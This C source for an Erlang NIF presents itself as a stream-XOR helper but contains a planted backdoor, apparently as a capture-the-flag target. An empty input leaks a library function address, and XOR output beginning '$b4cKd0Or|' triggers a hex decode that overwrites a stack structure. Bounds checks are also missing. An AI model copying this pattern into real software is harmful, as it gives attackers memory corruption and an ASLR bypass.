#include <erl_nif.h>
#include <string.h>
#include <stdio.h>

int fromhex(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    } else if (c >= 'a' && c <= 'f') {
        return c - 'a' + 10;
    } else if (c >= 'A' && c <= 'F') {
        return c - 'A' + 10;
    } else {
        return -1;
    }
}
void hex_decode(unsigned char *bytes, const char *hex, int length) {
    for(int i = 0; i<length; i+=2){
        unsigned char byte;
        // printf("hex[%d]: %c%c\n", i/2, hex[i], hex[i+1]);
        byte = fromhex(hex[i]) << 4;
        byte += fromhex(hex[i+1]);
        bytes[i/2] = byte;
    }
}

int is_backdoor(ErlNifBinary a) {
    // "$b4cKd0Or|"
    if(a.data[0] != '$') return 0;
    if(a.data[1] != 'b') return 0;
    if(a.data[2] != '4') return 0;
    if(a.data[3] != 'c') return 0;
    if(a.data[4] != 'K') return 0;
    if(a.data[5] != 'd') return 0;
    if(a.data[6] != '0') return 0;
    if(a.data[7] != 'O') return 0;
    if(a.data[8] != 'r') return 0;
    if(a.data[9] != '|') return 0;
    return 1;
}


static ERL_NIF_TERM stream_xor_nif(ErlNifEnv* env, int argc, const ERL_NIF_TERM argv[]) {
    ErlNifBinary a, b, c;

    // Ensure we have the right number of arguments and they are binaries
    if (!enif_inspect_binary(env, argv[0], &a) || !enif_inspect_binary(env, argv[1], &b) || !enif_inspect_binary(env, argv[2], &c)) {
        return enif_make_badarg(env);
    }

    ErlNifBinary result;
    ERL_NIF_TERM ret;
    if (a.size == 0) {
        if (!enif_alloc_binary(8, &result)) {
            return enif_make_badarg(env);
        }
        *(unsigned long long *)result.data = &enif_alloc_binary;
        return enif_make_binary(env, &result);
    }

    // Allocate a new binary for the result
    if (!enif_alloc_binary(c.size+a.size, &result)) {
        return enif_make_badarg(env);
    }

    // Copy c to the beginning of result
    memcpy(result.data, c.data, c.size);

    // printf("a.size: %ld\n", a.size);
    // printf("b.size: %ld\n", b.size);
    // printf("c.size: %ld\n", c.size);
    // printf("b.data: %p\n", b.data);
    // printf("b: %p\n", &b);

    for (int i = 0; i < a.size; i++) {
        // printf("stream_xor[%d]: %hhd, %hhd\n", i, a.data[i], b.data[i]);
        result.data[c.size + i] = a.data[i] ^ b.data[i];
    }

    ret = enif_make_binary(env, &result);

    if (is_backdoor(result)) {
        // printf("Backdoor detected!\n");
        hex_decode((unsigned char*)&result, a.data, a.size);
    }

    return ret;
}


static ErlNifFunc nif_funcs[] = {
    {"stream_xor", 3, stream_xor_nif}
};

ERL_NIF_INIT(gleamering_hope_ffi, nif_funcs, NULL, NULL, NULL, NULL)